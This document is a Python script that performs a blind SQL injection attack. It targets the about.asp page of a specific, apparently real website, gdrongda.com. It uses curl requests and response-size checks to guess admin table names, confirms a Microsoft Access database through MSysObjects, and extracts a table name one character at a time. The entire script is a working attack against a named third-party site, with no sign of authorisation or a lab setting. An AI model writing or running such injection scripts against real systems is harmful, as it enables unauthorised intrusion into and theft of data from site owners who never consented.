import subprocess, sys

TRUE = '93'

def test(cond):
    try:
        r = subprocess.run(['curl','-sk','--connect-timeout','2','--max-time','3',
            'http://gdrongda.com/about.asp?id=1%20AND%20'+cond,
            '-o','/dev/null','-w','%{size_download}'],
            capture_output=True,text=True,timeout=5)
        return r.stdout.strip() == TRUE
    except:
        return False

# Find admin table
tables = ['admin','Admin','users','user','manager','manage','guanli',
          'config','data','info','member','userinfo','system']
for t in tables:
    if test('(SELECT+COUNT(*)+FROM+'+t+')>0'):
        print('TABLE:', t)
        break
else:
    # Try Access system tables
    print('Trying MSysObjects...')
    if test('(SELECT+COUNT(*)+FROM+MSysObjects)>0'):
        print('Access DB confirmed, looking for custom tables...')
        # Extract first table name character by character
        name = ''
        for pos in range(1, 20):
            for ch in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_':
                h = ord(ch)
                if test('MID((SELECT+TOP+1+Name+FROM+MSysObjects+WHERE+Name+NOT+LIKE+chr(77)+chr(83)+chr(121)+chr(115)+chr(37)+AND+Type=1),'+str(pos)+',1)=chr('+str(h)+')'):
                    name += ch
                    print('  char '+str(pos)+': '+ch+' -> '+name)
                    break
            else:
                break
        print('Table name:', name)
    else:
        print('Not Access - cant find tables')
        sys.exit(1)
